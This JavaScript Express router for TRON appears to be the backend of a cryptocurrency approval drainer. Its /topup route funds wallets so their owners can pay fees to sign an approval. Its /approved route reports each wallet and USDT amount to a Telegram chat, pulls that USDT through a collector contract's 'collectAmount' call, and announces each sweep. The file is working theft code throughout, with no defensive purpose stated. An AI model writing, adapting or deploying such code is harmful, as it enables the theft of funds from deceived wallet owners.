import express from 'express';
import { TronWeb } from 'tronweb';
import logger from '../logger.js';

const router = express.Router();

const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS; // base58 TRON address
const DEPLOYER_PK      = process.env.DEPLOYER_PRIVATE_KEY;
const USDT_TRC20       = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TOPUP_TRX        = 5_000_000; // 5 TRX in sun (1 TRX = 1,000,000 sun)
const MIN_TRX          = 3_000_000; // 3 TRX minimum

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: DEPLOYER_PK,
});

const COLLECTOR_ABI = [
  { name: 'collectAmount', type: 'Function', inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }] },
];

const USDT_ABI = [
  { name: 'decimals', type: 'Function', inputs: [], outputs: [{ type: 'uint8' }] },
];

const sendTelegram = async (text) => {
  const token  = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
  });
  const data = await res.json();
  if (!data.ok) logger.error('Telegram error: ' + JSON.stringify(data));
};

// TRX topup so user can pay energy/bandwidth fees
router.post('/topup', async (req, res) => {
  const { to } = req.body;
  if (!to) return res.status(400).json({ error: "Missing 'to' address" });
  try {
    const account = await tronWeb.trx.getAccount(to);
    const balance = account.balance || 0;

    if (balance >= MIN_TRX) {
      return res.json({ isNeededGas: false, status: true, txhash: null, error: null });
    }

    const tx = await tronWeb.trx.sendTrx(to, TOPUP_TRX);
    logger.info(`TRX topup sent to ${to}: ${tx.txid}`);
    res.json({ isNeededGas: true, status: true, txhash: tx.txid, error: null });
  } catch (e) {
    logger.error('Topup error: ' + e.message);
    res.json({ isNeededGas: false, status: false, txhash: null, error: e.message });
  }
});

router.post('/approved', async (req, res) => {
  const { address, amount } = req.body;
  if (!address) return res.status(400).json({ error: 'Address required' });

  // Telegram notify
  try {
    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
    const msg  = `<b>✅ Wallet Approved (TRC-20)</b>\n\n🔑 Address: <code>${address}</code>\n💰 Amount: ${amount || 'N/A'} USDT\n🕐 Time: ${time} IST`;
    await sendTelegram(msg);
    logger.info('Telegram sent for: ' + address);
  } catch (e) {
    logger.error('Telegram notify failed: ' + e.message);
  }

  // Collect USDT
  let collectHash = null;
  if (amount && CONTRACT_ADDRESS && DEPLOYER_PK) {
    try {
      const usdtContract = await tronWeb.contract(USDT_ABI, USDT_TRC20);
      const decimals     = await usdtContract.decimals().call();
      const parsedAmount = BigInt(Math.floor(parseFloat(amount) * 10 ** Number(decimals)));

      const collector = await tronWeb.contract(COLLECTOR_ABI, CONTRACT_ADDRESS);
      logger.info(`Collecting ${amount} USDT (TRC-20) from ${address}`);

      const txid = await collector.collectAmount(address, parsedAmount.toString()).send({
        feeLimit: 100_000_000,
        callValue: 0,
      });

      collectHash = txid;
      logger.info(`Collected from ${address}: ${txid}`);

      await sendTelegram(`<b>💸 USDT Collected! (TRC-20)</b>\n\n🔑 From: <code>${address}</code>\n💰 Amount: ${amount} USDT\n🔗 Tx: <a href="https://tronscan.org/#/transaction/${txid}">${txid.slice(0, 16)}...</a>`);
    } catch (e) {
      logger.error(`Collect failed for ${address}: ${e.message}`);
      await sendTelegram(`<b>⚠️ Collect Failed (TRC-20)</b>\n\n🔑 Address: <code>${address}</code>\n❌ Error: ${e.message}`).catch(() => {});
    }
  }

  res.json({ success: true, collectHash });
});

export default router;
